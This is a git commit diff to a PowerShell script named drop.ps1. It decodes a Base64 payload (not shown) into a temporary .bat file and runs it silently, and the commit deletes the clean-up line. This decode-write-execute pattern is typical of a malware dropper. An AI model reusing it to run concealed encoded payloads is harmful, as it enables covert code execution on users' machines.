71a8f3ed48b8fca17a0d33a70610a9b98f71ef58
43a1723 <hai1723notgay@gmail.com>
2024-06-30 16:02:42 +0700

    Update drop.ps1

--- file/drop/drop.ps1
+++ file/drop/drop.ps1
@@ -2,4 +2,3 @@ $batContent = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String
 $tempBatFile = [System.IO.Path]::GetTempFileName() + ".bat"
 Set-Content -Path $tempBatFile -Value $batContent
 Start-Process -FilePath $tempBatFile -NoNewWindow -Wait
-Remove-Item -Path $tempBatFile
